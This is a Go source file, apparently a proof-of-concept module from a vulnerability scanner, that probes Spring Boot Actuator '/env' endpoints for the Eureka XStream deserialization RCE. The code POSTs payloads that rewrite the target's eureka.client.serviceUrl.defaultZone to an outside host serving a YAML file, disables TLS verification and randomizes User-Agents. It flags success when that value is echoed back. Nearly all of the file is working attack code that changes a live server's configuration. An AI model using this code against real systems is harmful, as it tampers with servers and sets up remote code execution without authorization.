package poc

import (
	"fmt"
	"github.com/fatih/color"
	"io/ioutil"
	"net/http"
	"ssp/common"
	"strings"
	"time"
)

func EurekaXstreamRCE(url string) {
	headers1 := map[string]string{
		"User-Agent":   common.GetRandomUserAgent(),
		"Content-Type": "application/x-www-form-urlencoded",
	}

	headers2 := map[string]string{
		"User-Agent":   common.GetRandomUserAgent(),
		"Content-Type": "application/json",
	}

	payload1 := "eureka.client.serviceUrl.defaultZone=http://127.0.0.2/example.yml"
	payload2 := "{\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://127.0.0.2/example.yml\"}"

	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	http.DefaultTransport.(*http.Transport).TLSClientConfig.InsecureSkipVerify = true

	tryPaths := []string{"env", "actuator/env"}
	targetStrings := []string{"127.0.0.2"}

	for _, path := range tryPaths {
		var req *http.Request
		var err error
		if path == "env" {
			req, err = http.NewRequest("POST", url+path, strings.NewReader(payload1))
		} else {
			req, err = http.NewRequest("POST", url+path, strings.NewReader(payload2))
		}
		if err != nil {
			fmt.Println("Error creating request:", err)
			return
		}
		var headers map[string]string
		if path == "env" {
			headers = headers1
		} else {
			headers = headers2
		}
		for key, value := range headers {
			req.Header.Set(key, value)
		}

		resp, err := client.Do(req)
		if err != nil {
			color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
			return
		}
		defer resp.Body.Close()

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			fmt.Println("Error reading response:", err)
			return
		}

		if common.ContainsAny(string(body), targetStrings) {
			common.PrintVulnerabilityConfirmation("EurekaXstreamRCE", url, "Null", "6")
			common.Vulnum++
			return
		}
	}

	color.Yellow("[-] %s 未发现Eureka_Xstream反序列化漏洞\n", url)

}
